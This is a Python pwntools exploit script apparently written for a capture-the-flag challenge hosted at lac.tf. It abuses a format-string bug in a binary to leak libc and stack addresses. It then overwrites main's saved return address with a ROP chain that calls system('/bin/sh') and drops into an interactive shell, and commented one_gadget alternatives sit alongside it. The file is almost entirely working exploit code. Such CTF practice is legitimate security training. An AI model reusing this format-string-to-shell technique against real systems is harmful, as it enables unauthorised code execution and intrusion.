#!/usr/bin/env python3
# Heavily inspired by writeup from https://www.youtube.com/watch?v=K5sTGQPs04M&list=PLUj83tCk_iA0OrxufomEOU9DXpFTW4q6k&index=6

from pwn import *

exe = ELF("./rut_roh_relro_patched")
libc = ELF("./libc-2.31.so")
ld = ELF("./ld-2.31.so")

context.binary = exe

#p = process("./rut_roh_relro_patched")
#gdb.attach(p)

p = remote("lac.tf", 31134)

# out = ""
# for i in range(40, 80):
#     out += f"{i}=%{i}$p "
# p.recvuntil(b"post?")
# p.sendline(out.encode())

# leak libc 
p.sendline(b"libc= %71$p, stack= %72$p")
p.recvuntil(b"libc=")
leaked_libc = int(p.recvuntil(b",").strip(b",").decode(), 16)
p.recvuntil(b"stack=")
leaked_stack = int(p.recvline().strip().decode(), 16)

libc.address = leaked_libc - (0x7ff1f3d9ed0a - 0x7ff1f3d7b000) # subtract constant offset to libc base
ret_ptr_main = leaked_stack - (0x7ffc21ff0b68 - 0x7ffc21ff0a78) # offset til ADRESSEN som holder return pointer fra main
log.success(f"{hex(libc.address) = }")
log.success(f"{hex(ret_ptr_main) = }")

one_gadget_r12_r13 = libc.address + 0xc961a
one_gadget_rsi_rdx = libc.address + 0xc9620
one_gadget_r12_rdx = libc.address + 0xc961d

pop_rsi = libc.address + 0x2590f
pop_r12 = libc.address + 0x23e9a

writes_r12 = {
    ret_ptr_main: pop_r12, 
    ret_ptr_main+0x8: 0,
    ret_ptr_main+0x10: one_gadget_r12_r13 #one gadget with rdx also works as both r13 and rdx are empty at the end of main
}
writes_rsi = {
    ret_ptr_main: pop_rsi, #this also works if we wanted to use the last onegadget
    ret_ptr_main+0x8: 0,
    ret_ptr_main+0x10: one_gadget_rsi_rdx
}

pop_rdi_ret = libc.address + 0x23796
ret = libc.address + 0x2235f
libc_system = libc.sym["system"]
binsh = next(libc.search(b"/bin/sh"))
libc_exit = libc.sym["exit"]

writes_binsh = {
    ret_ptr_main: pop_rdi_ret,
    ret_ptr_main+0x8: binsh,
    ret_ptr_main+0x10: ret,
    ret_ptr_main+0x18: libc_system,
    # ret_ptr_main+0x20: ret, # last two lines not necessary but good practise i guess, actually BREAKS the exploit remotely (works locally)
    # ret_ptr_main+0x20: libc_exit 
}

second_payload = fmtstr_payload(6, writes_binsh)

p.recvuntil(b"post?")
p.sendline(second_payload)

p.interactive()

"""
one_gadget libc-2.31.so
0xc961a execve("/bin/sh", r12, r13)
constraints:
  [r12] == NULL || r12 == NULL
  [r13] == NULL || r13 == NULL

0xc961d execve("/bin/sh", r12, rdx)
constraints:
  [r12] == NULL || r12 == NULL
  [rdx] == NULL || rdx == NULL

0xc9620 execve("/bin/sh", rsi, rdx)
constraints:
  [rsi] == NULL || rsi == NULL
  [rdx] == NULL || rdx == NULL
"""
